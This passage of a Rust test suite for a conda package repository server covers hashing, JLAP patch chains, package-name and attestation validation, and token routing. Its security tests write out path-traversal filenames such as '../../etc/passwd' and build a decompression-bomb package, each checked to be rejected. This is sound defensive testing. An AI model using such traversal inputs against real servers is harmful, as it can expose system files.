        let hash = blake2_256_keyed(b"test data", &key);
        assert_eq!(hash.len(), 32);

        // Same input with different key should produce different output
        let key2 = [1u8; 32];
        let hash2 = blake2_256_keyed(b"test data", &key2);
        assert_ne!(hash, hash2);
    }

    #[test]
    fn test_blake2_256_keyed_deterministic() {
        let key = [42u8; 32];
        let hash1 = blake2_256_keyed(b"deterministic input", &key);
        let hash2 = blake2_256_keyed(b"deterministic input", &key);
        assert_eq!(hash1, hash2);
    }

    #[test]
    fn test_sorted_compact_json() {
        let value = serde_json::json!({
            "zebra": 1,
            "alpha": 2,
            "middle": {"z": true, "a": false}
        });
        let compact = sorted_compact_json(&value);
        // Keys should be alphabetically sorted, no spaces
        assert_eq!(
            compact,
            r#"{"alpha":2,"middle":{"a":false,"z":true},"zebra":1}"#
        );
    }

    #[test]
    fn test_sorted_compact_json_patch_line() {
        let patch_line = serde_json::json!({
            "from": "aaaa",
            "patch": [{"op": "add", "path": "/packages/foo", "value": {}}],
            "to": "bbbb",
        });
        let compact = sorted_compact_json(&patch_line);
        assert!(compact.starts_with(r#"{"from":"aaaa","#));
        assert!(compact.contains(r#""to":"bbbb""#));
        // No spaces or newlines
        assert!(!compact.contains(' '));
        assert!(!compact.contains('\n'));
    }

    #[test]
    fn test_escape_json_pointer() {
        assert_eq!(escape_json_pointer("simple"), "simple");
        assert_eq!(escape_json_pointer("a/b"), "a~1b");
        assert_eq!(escape_json_pointer("a~b"), "a~0b");
        assert_eq!(escape_json_pointer("a~/b"), "a~0~1b");
    }

    #[test]
    fn test_build_bootstrap_jlap_structure() {
        let repodata = b"{}";
        let jlap = build_bootstrap_jlap(repodata);
        let text = std::str::from_utf8(&jlap).unwrap();
        let lines: Vec<&str> = text.split('\n').collect();

        // Bootstrap JLAP: IV + metadata + trailing checksum = 3 lines
        assert_eq!(lines.len(), 3, "bootstrap JLAP should have exactly 3 lines");

        // Line 0: IV (all zeros)
        assert_eq!(
            lines[0],
            "0000000000000000000000000000000000000000000000000000000000000000"
        );
        assert_eq!(lines[0].len(), 64);

        // Line 1: metadata with "latest" hash and "url"
        let metadata: serde_json::Value = serde_json::from_str(lines[1]).unwrap();
        assert_eq!(metadata["url"], "repodata.json");
        assert!(metadata["latest"].is_string());
        assert_eq!(metadata["latest"].as_str().unwrap().len(), 64);

        // Line 2: trailing checksum (64 hex chars)
        assert_eq!(lines[2].len(), 64);

        // No trailing newline
        assert!(!text.ends_with('\n'));
    }

    #[test]
    fn test_build_bootstrap_jlap_hash_matches_content() {
        let repodata = serde_json::to_string_pretty(&serde_json::json!({
            "info": {"subdir": "linux-64"},
            "packages": {},
            "packages.conda": {},
            "repodata_version": 1,
        }))
        .unwrap();

        let jlap = build_bootstrap_jlap(repodata.as_bytes());
        let text = std::str::from_utf8(&jlap).unwrap();
        let lines: Vec<&str> = text.split('\n').collect();

        let metadata: serde_json::Value = serde_json::from_str(lines[1]).unwrap();
        let latest_hex = metadata["latest"].as_str().unwrap();

        // Verify the hash matches BLAKE2b-256 of the repodata bytes
        let expected_hash = hex::encode(blake2_256(repodata.as_bytes()));
        assert_eq!(latest_hex, expected_hash);
    }

    #[test]
    fn test_verify_jlap_chain_valid() {
        let repodata = b"test repodata content";
        let jlap = build_bootstrap_jlap(repodata);
        assert!(verify_jlap_chain(&jlap).is_ok());
    }

    #[test]
    fn test_verify_jlap_chain_with_patches() {
        let from_hash = [0xAAu8; 32];
        let to_hash = [0xBBu8; 32];
        let patches = vec![(
            from_hash,
            vec![serde_json::json!({"op": "add", "path": "/packages/test", "value": {}})],
            to_hash,
        )];

        let jlap = build_jlap_file(&patches, &to_hash);
        assert!(verify_jlap_chain(&jlap).is_ok());
    }

    #[test]
    fn test_verify_jlap_chain_corrupted() {
        let repodata = b"test";
        let mut jlap = build_bootstrap_jlap(repodata);

        // Corrupt the trailing checksum
        let text = std::str::from_utf8(&jlap).unwrap().to_string();
        let lines: Vec<&str> = text.split('\n').collect();
        let corrupted = format!(
            "{}\n{}\n{}",
            lines[0], lines[1], "0000000000000000000000000000000000000000000000000000000000000000"
        );
        jlap = corrupted.into_bytes();

        let result = verify_jlap_chain(&jlap);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("checksum mismatch"));
    }

    #[test]
    fn test_verify_jlap_chain_too_short() {
        let result = verify_jlap_chain(b"one\ntwo");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too short"));
    }

    #[test]
    fn test_generate_repodata_patch_add_package() {
        let old = serde_json::json!({
            "packages": {},
            "packages.conda": {},
        });
        let new = serde_json::json!({
            "packages": {},
            "packages.conda": {
                "numpy-1.26.4-py312_0.conda": {
                    "name": "numpy",
                    "version": "1.26.4",
                }
            },
        });

        let ops = generate_repodata_patch(&old, &new).unwrap();
        assert_eq!(ops.len(), 1);
        assert_eq!(ops[0]["op"], "add");
        assert!(ops[0]["path"].as_str().unwrap().contains("numpy"));
    }

    #[test]
    fn test_generate_repodata_patch_remove_package() {
        let old = serde_json::json!({
            "packages": {"pkg-1.0.tar.bz2": {"name": "pkg"}},
            "packages.conda": {},
        });
        let new = serde_json::json!({
            "packages": {},
            "packages.conda": {},
        });

        let ops = generate_repodata_patch(&old, &new).unwrap();
        assert_eq!(ops.len(), 1);
        assert_eq!(ops[0]["op"], "remove");
    }

    #[test]
    fn test_generate_repodata_patch_replace_package() {
        let old = serde_json::json!({
            "packages": {
                "pkg-1.0.tar.bz2": {"name": "pkg", "version": "1.0"}
            },
            "packages.conda": {},
        });
        let new = serde_json::json!({
            "packages": {
                "pkg-1.0.tar.bz2": {"name": "pkg", "version": "1.0", "depends": ["python"]}
            },
            "packages.conda": {},
        });

        let ops = generate_repodata_patch(&old, &new).unwrap();
        assert_eq!(ops.len(), 1);
        assert_eq!(ops[0]["op"], "replace");
    }

    #[test]
    fn test_generate_repodata_patch_no_changes() {
        let data = serde_json::json!({
            "packages": {"a": {"name": "a"}},
            "packages.conda": {},
        });
        assert!(generate_repodata_patch(&data, &data).is_none());
    }

    #[test]
    fn test_generate_repodata_patch_multiple_operations() {
        let old = serde_json::json!({
            "packages": {
                "a-1.0.tar.bz2": {"name": "a"},
                "b-1.0.tar.bz2": {"name": "b"},
            },
            "packages.conda": {},
        });
        let new = serde_json::json!({
            "packages": {
                "b-1.0.tar.bz2": {"name": "b", "extra": true},
                "c-1.0.tar.bz2": {"name": "c"},
            },
            "packages.conda": {},
        });

        let ops = generate_repodata_patch(&old, &new).unwrap();
        // Remove a, replace b, add c = 3 operations
        assert_eq!(ops.len(), 3);

        let op_types: Vec<&str> = ops.iter().map(|o| o["op"].as_str().unwrap()).collect();
        assert!(op_types.contains(&"remove"));
        assert!(op_types.contains(&"add"));
        assert!(op_types.contains(&"replace"));
    }

    #[test]
    fn test_build_jlap_file_with_real_patch() {
        let old_repodata = serde_json::json!({
            "info": {"subdir": "linux-64"},
            "packages": {},
            "packages.conda": {},
            "repodata_version": 1,
        });
        let new_repodata = serde_json::json!({
            "info": {"subdir": "linux-64"},
            "packages": {},
            "packages.conda": {
                "scipy-1.12.0-py312_0.conda": {
                    "name": "scipy",
                    "version": "1.12.0",
                }
            },
            "repodata_version": 1,
        });

        let old_bytes = serde_json::to_string(&old_repodata).unwrap();
        let new_bytes = serde_json::to_string(&new_repodata).unwrap();

        let from_hash = blake2_256(old_bytes.as_bytes());
        let to_hash = blake2_256(new_bytes.as_bytes());

        let ops = generate_repodata_patch(&old_repodata, &new_repodata).unwrap();
        let patches = vec![(from_hash, ops, to_hash)];

        let jlap = build_jlap_file(&patches, &to_hash);
        let text = std::str::from_utf8(&jlap).unwrap();
        let lines: Vec<&str> = text.split('\n').collect();

        // IV + 1 patch + metadata + checksum = 4 lines
        assert_eq!(lines.len(), 4);

        // Verify patch line is valid JSON
        let patch_line: serde_json::Value = serde_json::from_str(lines[1]).unwrap();
        assert_eq!(patch_line["from"].as_str().unwrap(), hex::encode(from_hash));
        assert_eq!(patch_line["to"].as_str().unwrap(), hex::encode(to_hash));
        assert!(patch_line["patch"].is_array());

        // Verify chain integrity
        assert!(verify_jlap_chain(&jlap).is_ok());
    }

    #[test]
    fn test_jlap_checksum_chain_continuity() {
        // Build a multi-patch JLAP and verify each link in the chain
        let h1 = [0x11u8; 32];
        let h2 = [0x22u8; 32];
        let h3 = [0x33u8; 32];

        let patches = vec![
            (
                h1,
                vec![serde_json::json!({"op": "add", "path": "/p/a", "value": 1})],
                h2,
            ),
            (
                h2,
                vec![serde_json::json!({"op": "add", "path": "/p/b", "value": 2})],
                h3,
            ),
        ];

        let jlap = build_jlap_file(&patches, &h3);
        assert!(verify_jlap_chain(&jlap).is_ok());

        let text = std::str::from_utf8(&jlap).unwrap();
        let lines: Vec<&str> = text.split('\n').collect();
        // IV + 2 patches + metadata + checksum = 5 lines
        assert_eq!(lines.len(), 5);
    }

    #[test]
    fn test_parse_range_start_basic() {
        assert_eq!(parse_range_start("bytes=100-", 1000), Some(100));
        assert_eq!(parse_range_start("bytes=0-", 1000), Some(0));
        assert_eq!(parse_range_start("bytes=999-", 1000), Some(999));
    }

    #[test]
    fn test_parse_range_start_beyond_length() {
        assert_eq!(parse_range_start("bytes=1000-", 1000), None);
        assert_eq!(parse_range_start("bytes=5000-", 100), None);
    }

    #[test]
    fn test_parse_range_start_with_end() {
        assert_eq!(parse_range_start("bytes=100-200", 1000), Some(100));
    }

    #[test]
    fn test_parse_range_start_invalid() {
        assert_eq!(parse_range_start("invalid", 1000), None);
        assert_eq!(parse_range_start("bytes=abc-", 1000), None);
    }

    #[test]
    fn test_jlap_metadata_has_required_fields() {
        let repodata = b"test content";
        let jlap = build_bootstrap_jlap(repodata);
        let text = std::str::from_utf8(&jlap).unwrap();
        let lines: Vec<&str> = text.split('\n').collect();

        let metadata: serde_json::Value = serde_json::from_str(lines[1]).unwrap();

        // Required fields per JLAP spec
        assert!(
            metadata.get("latest").is_some(),
            "metadata must have 'latest' field"
        );
        assert!(
            metadata.get("url").is_some(),
            "metadata must have 'url' field"
        );
        assert_eq!(metadata["url"], "repodata.json");
    }

    #[test]
    fn test_generate_repodata_patch_removed_array_change() {
        let old = serde_json::json!({
            "packages": {},
            "packages.conda": {},
            "removed": [],
        });
        let new = serde_json::json!({
            "packages": {},
            "packages.conda": {},
            "removed": ["old-pkg-1.0.tar.bz2"],
        });

        let ops = generate_repodata_patch(&old, &new).unwrap();
        assert_eq!(ops.len(), 1);
        assert_eq!(ops[0]["op"], "replace");
        assert_eq!(ops[0]["path"], "/removed");
    }

    // -----------------------------------------------------------------------
    // CEP-26: Naming validation
    // -----------------------------------------------------------------------

    #[test]
    fn test_cep26_valid_package_names() {
        assert!(validate_cep26_name("numpy").is_ok());
        assert!(validate_cep26_name("scikit-learn").is_ok());
        assert!(validate_cep26_name("python-dateutil").is_ok());
        assert!(validate_cep26_name("h5py").is_ok());
        assert!(validate_cep26_name("r-base").is_ok());
        assert!(validate_cep26_name("7zip").is_ok());
        assert!(validate_cep26_name("libffi").is_ok());
        assert!(validate_cep26_name("ca-certificates").is_ok());
        assert!(validate_cep26_name("pip").is_ok());
        assert!(validate_cep26_name("blas.1.0").is_ok());
    }

    #[test]
    fn test_cep26_invalid_package_names() {
        // Uppercase not allowed
        assert!(validate_cep26_name("NumPy").is_err());
        // Empty
        assert!(validate_cep26_name("").is_err());
        // Too long
        assert!(validate_cep26_name(&"a".repeat(65)).is_err());
        // 64 chars is OK
        assert!(validate_cep26_name(&"a".repeat(64)).is_ok());
        // Consecutive underscores
        assert!(validate_cep26_name("bad__name").is_err());
        // Invalid characters
        assert!(validate_cep26_name("pkg@1.0").is_err());
        assert!(validate_cep26_name("pkg name").is_err());
        assert!(validate_cep26_name("pkg/name").is_err());
        // Must start with alphanumeric
        assert!(validate_cep26_name("-leading").is_err());
        assert!(validate_cep26_name(".leading").is_err());
        assert!(validate_cep26_name("_leading").is_err());
    }

    #[test]
    fn test_cep26_valid_versions() {
        assert!(validate_cep26_version("1.0").is_ok());
        assert!(validate_cep26_version("1.26.4").is_ok());
        assert!(validate_cep26_version("2024.01.01").is_ok());
        assert!(validate_cep26_version("1.0rc1").is_ok());
        assert!(validate_cep26_version("1.0+local").is_ok());
        assert!(validate_cep26_version("1!2.0").is_ok()); // epoch
        assert!(validate_cep26_version("0").is_ok());
    }

    #[test]
    fn test_cep26_invalid_versions() {
        assert!(validate_cep26_version("").is_err());
        assert!(validate_cep26_version(&"1".repeat(65)).is_err());
        assert!(validate_cep26_version("1.0 beta").is_err()); // space
        assert!(validate_cep26_version("1.0@2").is_err()); // @ not allowed
        assert!(validate_cep26_version("V1.0").is_err()); // uppercase
    }

    #[test]
    fn test_cep26_valid_build_strings() {
        assert!(validate_cep26_build("py312_0").is_ok());
        assert!(validate_cep26_build("py312h2809609_0").is_ok());
        assert!(validate_cep26_build("hd8ed1ab_0").is_ok());
        assert!(validate_cep26_build("0").is_ok());
        assert!(validate_cep26_build("cuda12.0_0").is_ok());
        assert!(validate_cep26_build("np1.26+mkl").is_ok());
    }

    #[test]
    fn test_cep26_invalid_build_strings() {
        assert!(validate_cep26_build("").is_err());
        assert!(validate_cep26_build(&"a".repeat(65)).is_err());
        assert!(validate_cep26_build("build-string").is_err()); // hyphen not allowed
        assert!(validate_cep26_build("build string").is_err()); // space
    }

    #[test]
    fn test_cep26_filename_length() {
        assert!(validate_cep26_filename("numpy-1.26.4-py312_0.conda").is_ok());
        assert!(validate_cep26_filename(&"a".repeat(211)).is_ok());
        assert!(validate_cep26_filename(&"a".repeat(212)).is_err());
    }

    #[test]
    fn test_cep26_valid_subdirs() {
        assert!(validate_cep26_subdir("noarch").is_ok());
        assert!(validate_cep26_subdir("linux-64").is_ok());
        assert!(validate_cep26_subdir("linux-aarch64").is_ok());
        assert!(validate_cep26_subdir("osx-arm64").is_ok());
        assert!(validate_cep26_subdir("win-64").is_ok());
        assert!(validate_cep26_subdir("linux-32").is_ok());
        assert!(validate_cep26_subdir("linux-ppc64le").is_ok());
        assert!(validate_cep26_subdir("linux-s390x").is_ok());
    }

    #[test]
    fn test_cep26_invalid_subdirs() {
        // Too long
        assert!(validate_cep26_subdir(&"a".repeat(33)).is_err());
        // Uppercase
        assert!(validate_cep26_subdir("Linux-64").is_err());
        // No hyphen
        assert!(validate_cep26_subdir("linux64").is_err());
        // Special characters
        assert!(validate_cep26_subdir("linux_64").is_err());
    }

    #[test]
    fn test_cep26_naming_integration() {
        // Valid full set
        assert!(validate_cep26_naming(
            "numpy",
            "1.26.4",
            "py312_0",
            "numpy-1.26.4-py312_0.conda",
            "linux-64"
        )
        .is_ok());

        // Invalid name bubbles up
        let err = validate_cep26_naming(
            "NumPy",
            "1.26.4",
            "py312_0",
            "NumPy-1.26.4-py312_0.conda",
            "linux-64",
        )
        .unwrap_err();
        assert!(
            err.contains("lowercase"),
            "error should mention lowercase: {}",
            err
        );

        // Invalid version bubbles up
        let err = validate_cep26_naming(
            "numpy",
            "1.26 4",
            "py312_0",
            "numpy-1.26 4-py312_0.conda",
            "linux-64",
        )
        .unwrap_err();
        assert!(err.contains("invalid character"), "error: {}", err);

        // Invalid build bubbles up
        let err = validate_cep26_naming(
            "numpy",
            "1.26.4",
            "py312-0",
            "numpy-1.26.4-py312-0.conda",
            "linux-64",
        )
        .unwrap_err();
        assert!(err.contains("invalid character"), "error: {}", err);
    }

    // -----------------------------------------------------------------------
    // CEP-27: Publish attestation validation
    // -----------------------------------------------------------------------

    fn make_valid_attestation(filename: &str, sha256: &str) -> serde_json::Value {
        serde_json::json!({
            "_type": "https://in-toto.io/Statement/v1",
            "subject": [{
                "name": filename,
                "digest": { "sha256": sha256 }
            }],
            "predicateType": "https://schemas.conda.org/attestations-publish-1.schema.json",
            "predicate": {
                "targetChannel": "https://my-registry.example.com/conda/main"
            }
        })
    }

    #[test]
    fn test_cep27_valid_attestation() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = make_valid_attestation("numpy-1.26.4-py312_0.conda", sha);
        assert!(validate_cep27_attestation(&att, "numpy-1.26.4-py312_0.conda", sha).is_ok());
    }

    #[test]
    fn test_cep27_valid_attestation_no_predicate() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": "https://in-toto.io/Statement/v1",
            "subject": [{
                "name": "pkg-1.0-py312_0.conda",
                "digest": { "sha256": sha }
            }],
            "predicateType": "https://schemas.conda.org/attestations-publish-1.schema.json",
            "predicate": null
        });
        assert!(validate_cep27_attestation(&att, "pkg-1.0-py312_0.conda", sha).is_ok());
    }

    #[test]
    fn test_cep27_wrong_statement_type() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": "https://in-toto.io/Statement/v0.1",
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("_type"), "error: {}", err);
    }

    #[test]
    fn test_cep27_wrong_predicate_type() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
            "predicateType": "https://example.com/wrong",
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("predicateType"), "error: {}", err);
    }

    #[test]
    fn test_cep27_mismatched_filename() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = make_valid_attestation("wrong-filename.conda", sha);
        let err = validate_cep27_attestation(&att, "actual-filename.conda", sha).unwrap_err();
        assert!(err.contains("does not match"), "error: {}", err);
    }

    #[test]
    fn test_cep27_mismatched_sha256() {
        let att = make_valid_attestation(
            "pkg.conda",
            "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
        );
        let err = validate_cep27_attestation(
            &att,
            "pkg.conda",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        )
        .unwrap_err();
        assert!(err.contains("does not match"), "error: {}", err);
    }

    #[test]
    fn test_cep27_invalid_sha256_format() {
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {"sha256": "too-short"}}],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", "too-short").unwrap_err();
        assert!(err.contains("64-character hex"), "error: {}", err);
    }

    #[test]
    fn test_cep27_multiple_subjects_rejected() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [
                {"name": "pkg1.conda", "digest": {"sha256": sha}},
                {"name": "pkg2.conda", "digest": {"sha256": sha}},
            ],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "pkg1.conda", sha).unwrap_err();
        assert!(err.contains("exactly 1"), "error: {}", err);
    }

    #[test]
    fn test_cep27_trailing_slash_in_target_channel() {
        let sha = "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b";
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [{"name": "pkg.conda", "digest": {"sha256": sha}}],
            "predicateType": CEP27_PREDICATE_TYPE,
            "predicate": {
                "targetChannel": "https://example.com/conda/"
            }
        });
        let err = validate_cep27_attestation(&att, "pkg.conda", sha).unwrap_err();
        assert!(err.contains("trailing slash"), "error: {}", err);
    }

    #[test]
    fn test_cep27_missing_fields() {
        // Missing _type
        let att = serde_json::json!({"subject": [], "predicateType": "x"});
        assert!(validate_cep27_attestation(&att, "", "")
            .unwrap_err()
            .contains("_type"));

        // Missing predicateType
        let att = serde_json::json!({"_type": INTOTO_STATEMENT_V1, "subject": []});
        assert!(validate_cep27_attestation(&att, "", "")
            .unwrap_err()
            .contains("predicateType"));

        // Missing subject
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        assert!(validate_cep27_attestation(&att, "", "")
            .unwrap_err()
            .contains("subject"));
    }

    #[test]
    fn test_cep27_empty_subject_array() {
        let att = serde_json::json!({
            "_type": INTOTO_STATEMENT_V1,
            "subject": [],
            "predicateType": CEP27_PREDICATE_TYPE,
        });
        let err = validate_cep27_attestation(&att, "", "").unwrap_err();
        assert!(err.contains("exactly 1"), "error: {}", err);
    }

    // -----------------------------------------------------------------------
    // Security hardening tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_filename_path_traversal_rejected() {
        // Path traversal sequences must be rejected
        assert!(validate_cep26_filename("../../etc/passwd").is_err());
        assert!(validate_cep26_filename("foo/../bar.conda").is_err());
        assert!(validate_cep26_filename("foo/bar.conda").is_err());
        assert!(validate_cep26_filename("foo\\bar.conda").is_err());
        assert!(validate_cep26_filename("foo\0bar.conda").is_err());
        // Normal filenames pass
        assert!(validate_cep26_filename("numpy-1.26.4-py312_0.conda").is_ok());
        assert!(validate_cep26_filename("pkg-1.0-0.tar.bz2").is_ok());
    }

    #[test]
    fn test_extract_upload_filename_sanitizes_content_disposition() {
        use axum::http::HeaderMap;

        // Normal Content-Disposition
        let mut headers = HeaderMap::new();
        headers.insert(
            "Content-Disposition",
            "attachment; filename=\"numpy-1.0-0.conda\""
                .parse()
                .unwrap(),
        );
        assert_eq!(
            extract_upload_filename(&headers).unwrap(),
            "numpy-1.0-0.conda"
        );

        // Content-Disposition with trailing params (M4 fix)
        let mut headers = HeaderMap::new();
        headers.insert(
            "Content-Disposition",
            "attachment; filename=\"numpy-1.0-0.conda\"; other=value"
                .parse()
                .unwrap(),
        );
        assert_eq!(
            extract_upload_filename(&headers).unwrap(),
            "numpy-1.0-0.conda"
        );

        // Path traversal in filename
        let mut headers = HeaderMap::new();
        headers.insert(
            "Content-Disposition",
            "attachment; filename=\"../../evil.conda\"".parse().unwrap(),
        );
        assert!(extract_upload_filename(&headers).is_err());

        // X-Package-Filename fallback
        let mut headers = HeaderMap::new();
        headers.insert("X-Package-Filename", "numpy-1.0-0.conda".parse().unwrap());
        assert_eq!(
            extract_upload_filename(&headers).unwrap(),
            "numpy-1.0-0.conda"
        );

        // Missing both headers
        let headers = HeaderMap::new();
        assert!(extract_upload_filename(&headers).is_err());
    }

    #[test]
    fn test_etag_uses_full_sha256() {
        let etag = compute_etag(b"test data");
        // Full SHA-256 is 64 hex chars, wrapped in quotes: "xxxx...xxxx"
        assert_eq!(etag.len(), 66);
        assert!(etag.starts_with('"'));
        assert!(etag.ends_with('"'));
        // Must not be a weak ETag
        assert!(!etag.starts_with("W/"));

        // Different content produces different ETags
        let etag2 = compute_etag(b"different data");
        assert_ne!(etag, etag2);
    }

    #[test]
    fn test_v2_info_tar_beyond_decompressed_budget_truncates_not_buffers() {
        // #4040: the v2 info tar now streams through the reference reader into
        // the shared budgeted walk, replacing the old 100 MiB private
        // buffering cap. A member past the (test-shrunk) budget must truncate
        // the walk — the index behind it is never seen, extraction yields
        // nothing — rather than buffer the inflated bytes or panic.
        let index = serde_json::json!({
            "name": "bomb",
            "version": "1.0.0",
            "build": "0",
            "depends": [],
        });
        let index_bytes = serde_json::to_vec(&index).unwrap();
        let filler = vec![b'x'; 2 * 1024 * 1024];

        let mut tar_buf = Vec::new();
        {
            let mut tar_builder = tar::Builder::new(&mut tar_buf);
            // Filler FIRST, so the walk hits the budget before index.json.
            let mut header = tar::Header::new_gnu();
            header.set_size(filler.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/files", &filler[..])
                .unwrap();
            let mut header = tar::Header::new_gnu();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar_builder
                .append_data(&mut header, "info/index.json", &index_bytes[..])
                .unwrap();
            tar_builder.finish().unwrap();
        }
        let compressed_tar = zstd::encode_all(std::io::Cursor::new(&tar_buf), 3).unwrap();

        let mut package = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut package));
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            writer.start_file("metadata.json", options).unwrap();
            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
            writer
                .start_file("info-pkg-1.0-build_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &compressed_tar).unwrap();
            writer.finish().unwrap();
        }

        // Shrink the shared decompressed budget below the filler. nextest
        // isolates every test in its own process, so the env override cannot
        // leak into a neighbour.
        std::env::set_var("MAX_INGEST_DECOMPRESSED_BYTES", "1048576");
        let result = extract_conda_v2_metadata(&package);
        std::env::remove_var("MAX_INGEST_DECOMPRESSED_BYTES");

        assert!(
            result.is_none(),
            "index.json past the decompressed budget must not be extracted"
        );
    }

    #[test]
    fn test_subdir_validated_in_build_repodata_path() {
        // validate_cep26_subdir rejects traversal-like patterns
        assert!(validate_cep26_subdir("../etc").is_err());
        assert!(validate_cep26_subdir("foo/bar").is_err());
        assert!(validate_cep26_subdir("LINUX-64").is_err());
        // Valid subdirs pass
        assert!(validate_cep26_subdir("linux-64").is_ok());
        assert!(validate_cep26_subdir("noarch").is_ok());
    }

    // =======================================================================
    // Signature verification (bead: artifact-keeper-9sw)
    //
    // Verify that a signed repodata payload can be verified against the
    // corresponding public key. Mirrors the pattern in signing_service tests.
    // =======================================================================

    #[test]
    fn test_signature_verifies_against_public_key() {
        use rsa::pkcs1v15::{SigningKey as RsaSigningKey, VerifyingKey};
        use rsa::pkcs8::{DecodePublicKey, EncodePublicKey};
        use rsa::signature::{Signer, Verifier};
        use rsa::{RsaPrivateKey, RsaPublicKey};

        // Generate a fresh RSA-2048 key pair
        let mut rng = rsa::rand_core::OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, 2048).expect("keygen");
        let public_key = RsaPublicKey::from(&private_key);

        let public_pem = public_key
            .to_public_key_pem(rsa::pkcs8::LineEnding::LF)
            .expect("pub pem");

        // Build a sample repodata JSON (same structure the handler produces)
        let repodata = serde_json::json!({
            "info": { "subdir": "noarch" },
            "packages": {},
            "packages.conda": {
                "test-pkg-1.0-0.conda": {
                    "name": "test-pkg",
                    "version": "1.0",
                    "build": "0",
                    "build_number": 0,
                    "depends": [],
                    "sha256": "abc123",
                    "size": 1024,
                    "subdir": "noarch",
                }
            },
            "repodata_version": 1,
        });

        // Sign with the private key (compact JSON, matching repodata_json_sig handler)
        let json_bytes = serde_json::to_vec(&repodata).unwrap();
        let signing_key = RsaSigningKey::<sha2::Sha256>::new(private_key);
        let signature = signing_key.sign(&json_bytes);

        // Verify with the public key (PEM round-trip)
        let parsed_pub = RsaPublicKey::from_public_key_pem(&public_pem).unwrap();
        let verifying_key = VerifyingKey::<sha2::Sha256>::new(parsed_pub);
        assert!(
            verifying_key.verify(&json_bytes, &signature).is_ok(),
            "Signature should verify against the public key"
        );
    }

    // =======================================================================
    // Token-channel GET routing (regression: token-router GET param shift)
    // =======================================================================

    /// The conda token router nests every read route under a leading
    /// `/:token` segment. Before the fix, those routes pointed at the
    /// non-token handlers whose `Path` extractors bound only
    /// `(repo_key, subdir[, filename])`, so the leading token shifted every
    /// parameter by one (`repo_key` received the token) and a valid
    /// token-channel read 401/404'd because resolution ran against a bogus
    /// repo key.
    ///
    /// This test mounts `token_router()` directly (credential injection is the
    /// visibility middleware's job and is covered in `middleware::auth`
    /// tests) and proves the token-aware handlers now bind the SECOND path
    /// segment as the repo key: a valid key resolves (200) while a bogus key
    /// 404s, and the package download binds the final segment as the
    /// filename.
    #[tokio::test]
    async fn test_token_channel_get_routes_bind_repo_key_not_token() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let repo = fx.repo_info("local", None);
        let filename = "pkg-1.0-0.tar.bz2";
        let path = format!("noarch/{filename}");
        let storage_key = format!("conda/{}/{}", fx.repo_id, path);
        let content = Bytes::from_static(b"fake-conda-package-bytes");
        tdh::seed_artifact(
            &fx.state,
            &fx.pool,
            &repo,
            &storage_key,
            &path,
            "pkg",
            "1.0",
            "application/x-tar",
            content.clone(),
            fx.user_id,
        )
        .await;

        // Any opaque string in the token slot; the handler discards it and the
        // middleware (not mounted here) is what validates it.
        let tok = "ak_url_token_placeholder";
        let key = fx.repo_key.clone();

        let assertions = async {
            // repodata.json resolves the real repo key (segment 2) and lists
            // the seeded package -> the token segment was correctly discarded.
            let app = fx.router_with_auth(token_router());
            let (status, body) =
                tdh::send(app, tdh::get(format!("/{tok}/{key}/noarch/repodata.json"))).await;
            assert_eq!(
                status,
                StatusCode::OK,
                "token-channel repodata must resolve the real repo key"
            );
            let json: serde_json::Value = serde_json::from_slice(&body).unwrap();
            assert!(
                json["packages"]
                    .as_object()
                    .is_some_and(|m| m.contains_key(filename)),
                "repodata must list the seeded package, got: {json}"
            );

            // A bogus repo key in segment 2 must 404 -> confirms segment 2 (not
            // segment 1, the token) is treated as the repo key.
            let app = fx.router_with_auth(token_router());
            let (status, _b) = tdh::send(
                app,
                tdh::get(format!("/{tok}/no-such-repo-xyz/noarch/repodata.json")),
            )
            .await;
            assert_eq!(
                status,
                StatusCode::NOT_FOUND,
                "an unknown repo key in the token URL must 404"
            );

            // Compressed + metadata read routes resolve the repo key too.
            for suffix in [
                "noarch/repodata.json.bz2",
                "noarch/repodata.json.zst",
